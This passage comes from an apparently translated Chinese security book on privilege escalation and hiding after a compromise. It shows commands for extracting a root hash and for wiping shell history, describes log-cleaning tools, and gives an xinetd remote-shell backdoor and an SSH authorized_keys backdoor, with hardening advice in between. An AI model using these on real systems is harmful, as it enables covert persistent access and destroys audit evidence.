
# 118 第一部分：黑客技术与防御

wrongpassword 密码错误
530 登录错误。
CWD ~
530 使用 USER 和 PASS 登录。
由主机关闭连接。

```bash
[bash]$ strings /core | grep root
root:$1PykB83bckLZ7CbPhXlnoql:2241:0:9999:7::
```

一旦入侵者获得了 root 用户的哈希访问权限，他可以使用 John the Ripper 等工具强制破解密码。请参阅 **securityfocus.com/bid/261** 获取关于 Solaris 漏洞的更多信息。参考第 4 章了解如何使用 John the Ripper 进行密码破解。

![](img/17cb132e6294dc7f5e0eadf90c1f172_0.png)

# 及时安装补丁

软件供应商经常发布补丁以修复漏洞。在漏洞被利用之前，确保已安装此类补丁。

# 配置错误

通常，管理员会将注意力完全放在远程服务的加固上。对本地服务应用程序的疏忽可能会导致本地用户获得更高的权限。例如，管理员可能会故意配置运行在主机上的数据库以允许任何用户连接。尽管防火墙阻止远程用户登录数据库，但这种配置可能允许本地用户提升权限。因此，强烈建议对本地服务应用程序进行常规加固和审计。

# 总结

本章介绍了入侵者用于提升权限的技术。你学习了信任本地用户的危险性、文件权限、配置错误以及软件漏洞。一旦入侵者获得了 root 权限，他将拥有完全控制权。入侵者必须隐藏其踪迹，并植入木马以确保持续访问。这些主题将在后续章节讨论。请参考本书的第二部分了解如何进行主机加固，这将有助于防御本章介绍许多权限提升攻击。

# 第 6 章：隐藏

在本章节中：
- 清理日志
- 后门
- Rootkits（根内核程序）
- 总结

`root/.bash_history` 片段提供了一个主机被破坏后常见的典型黑客活动示例。

# 禁用 Shell 历史

为了禁用命令历史，入侵者可以将 shell 历史文件设置为 `/dev/null` 的符号链接：

```bash
[bash]# rm -rf /root/.bash_history
[bash]# ln -s /dev/null /root/.bash_history
```

现在，任何尝试写入 `/root/.bash_history` 的进程将写入 `/dev/null`，这是一个空文件。这将导致 bash 生成的所有历史数据被丢弃。

# 启用审计和日志

历史文件的目的是帮助用户回忆最近执行的命令。从安全角度来看，不应信任用户的 shell 历史文件，用户可能会删除或编辑该文件以包含他们想要的信息。相反，管理员应该将精力放在书中第二部分描述系统审计和日志策略上。

# 清理 /var

`/var` 目录通常包含以下文件：
- `utmp` 和 `wtmp`：包含登录系统的信息。
- `messages` 和 `secure`：由 syslog 守护进程记录各种应用程序和守护进程提交的日志。
- `xferlog`：由 FTP 守护进程记录数据传输请求。
- `maillog`：由 SMTP 服务器记录邮件传输。
- `lastlog`：包含最近登录的用户信息。

入侵者可能会手动编辑列出的文件以隐藏其踪迹。通常，入侵者使用 `zap3` 等自动化工具完成此任务。`zap3` 工具可以清理 `utmp`、`wtmp`、`messages`、`secure` 和 `lastlog`。它从 http://www.packetstormsecurity.org/ 获取。此外，入侵者可能会禁用 syslogd 等服务并修改其配置文件（syslog.conf），将日志写入 `/dev/null`。

# 后门

一旦入侵者获得系统的访问，他们可能希望维持特权状态。本节介绍了高级黑客用于确保持续访问受损主机的不同方法。

# 安装远程 Shell

入侵者可以在 `inetd.conf` 或 `xinetd` 目录中添加条目，使 `inetd` 或 `xinetd` 在特定端口提供远程 shell。这可以通过配置 `inetd` 或 `xinetd` 执行 `/bin/bash` 或其他命令 shell 来。一旦完成，攻击者可以 telnet 连接到受害端口。

```xinetd
{
    socket_type = stream
    wait = no
    server = /bin/bash
}
```

为了使此生效，必须重启 `xinetd`。

# SSH 的 authorized_keys

如果受害者运行着 SSH 服务器，入侵者可以通过将公钥放入 `.ssh` 目录来维持访问。SSH 将信任此公钥并允许拥有私钥的入侵者登录。

# 滥用 SSH 授权密钥机制获取 root 权限

入侵者可以在其主机上使用 `ssh-keygen` 创建所需的公私钥对：

```bash
$ ssh-keygen -t rsa
Generating rsa key pair.
Enter file in save the key (/home/intruder/.ssh/):
Created directory '/home/intruder/.ssh'.
Enter passphrase (empty for no passphrase): [enter]
Enter same passphrase again: [enter]
Your identification has been saved in /home/intruder/.ssh/id_rsa.
Your public key has been saved in /home/intruder/.ssh/id_rsa.pub.
The key fingerprint is:
38:33:7b:db:05:00:10:62:57:bc:8b:85:05:9a:a9@intrudershost
```

现在，入侵者必须将 `.ssh/id_rsa.pub` 的内容复制到受害者主机的 `.ssh/authorized_keys`。完成后，入侵者可以无密码 SSH 登录受害者主机：

```bash
$ ssh root@victim’s_address
Last login: Sun Mar 30 02:23:48 2003 from intruder’s_host
```

# 不允许 root 通过 SSH 登录

不要允许 root 通过 SSH 登录。要执行此规则，请编辑 `sshd_config` 并确保存在以下行：

```ssh
PermitRootLogin no
```

# Loki2

Loki2 是一款免费提供的工具，经常被入侵者用于安装后门。它使用 ICMP_ECHO 和 ICMP_REPLY 数据包来隧道 shell 命令。这使得检测变得极其困难，因为它的数据包看起来就像 ping 工具生成的 ICMP 流量。
